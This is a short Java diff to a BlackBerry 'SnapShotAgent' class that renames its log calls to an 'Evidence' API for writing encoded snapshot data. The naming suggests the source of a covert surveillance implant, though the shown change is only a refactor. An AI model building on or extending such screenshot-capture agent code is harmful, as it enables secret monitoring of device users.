@@ -21,8 +21,8 @@ import net.rim.device.api.util.DataBuffer;
 import blackberry.config.Conf;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
-import blackberry.log.Log;
-import blackberry.log.LogType;
+import blackberry.evidence.Evidence;
+import blackberry.evidence.EvidenceType;
 import blackberry.utils.Check;
 import blackberry.utils.WChar;
 
@@ -55,7 +55,7 @@ public final class SnapShotAgent extends Agent {
         super(Agent.AGENT_SNAPSHOT, agentEnabled, Conf.AGENT_SNAPSHOT_ON_SD,
                 "SnapShotAgent");
         //#ifdef DBC
-        Check.asserts(Log.convertTypeLog(agentId) == LogType.SNAPSHOT,
+        Check.asserts(Evidence.convertTypeEvidence(agentId) == EvidenceType.SNAPSHOT,
                 "Wrong Conversion");
         //#endif
     }
@@ -111,12 +111,12 @@ public final class SnapShotAgent extends Agent {
         final byte[] plain = encoded.getData();
 
         //#ifdef DBC
-        Check.requires(log != null, "Null log");
+        Check.requires(evidence != null, "Null log");
         //#endif
-        synchronized (log) {
-            log.createLog(getAdditionalData());
-            log.writeLog(plain);
-            log.close();
+        synchronized (evidence) {
+            evidence.createEvidence(getAdditionalData());
+            evidence.writeEvidence(plain);
+            evidence.close();
         }
 
         //#ifdef DEBUG
